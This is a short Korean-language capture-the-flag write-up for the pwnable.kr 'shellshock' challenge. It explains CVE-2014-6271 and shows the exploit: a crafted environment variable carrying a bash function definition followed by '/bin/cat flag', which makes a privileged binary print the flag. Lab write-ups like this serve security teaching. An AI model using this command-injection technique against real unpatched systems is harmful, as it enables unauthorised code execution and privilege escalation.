# 문제
Mommy, there was a shocking news about bash.
I bet you already know, but lets just make it sure:)

ssh shellshock@pwnable.kr -p2222 (pw:guest)

---
# 개요
```
shellshock@ubuntu:~$ ls
bash  flag  shellshock	shellshock.c
shellshock@ubuntu:~$ cat shellshock.c
#include <stdio.h>
int main(){
	setresuid(getegid(), getegid(), getegid());
	setresgid(getegid(), getegid(), getegid());
	system("/home/shellshock/bash -c 'echo shock_me'");
	return 0;
}

shellshock@ubuntu:~$
```
shellshock 취약점은 bash가 subshell을 실행시키면서 발생한다.  
bash의 환경변수에 함수 정의를 이용해서 원격 코드를 추가할 수 있고 다음 bash 가 사용될 때 추가된 코드가 실행됩니다. 즉 함수정의 뒤에 임의의 명령을 추가하면 bash는 환경변수를 import 할때 끝에 추가된 명령까지 같이 실행하게 된다.  
이를 이용하여 test 라는 환경 변수에 함수정의를 이용하여 /bin/cat/flag 라는 명령을 추가한 후 바이너리를 실행하면 취약점에 의해 플래그를 출력할 것입니다
```
shellshock@ubuntu:~$ export test='() { echo Hi; }; /bin/cat flag'
shellshock@ubuntu:~$ ./shellshock
only if I knew CVE-2014-6271 ten years ago..!!
Segmentation fault
shellshock@ubuntu:~$
```
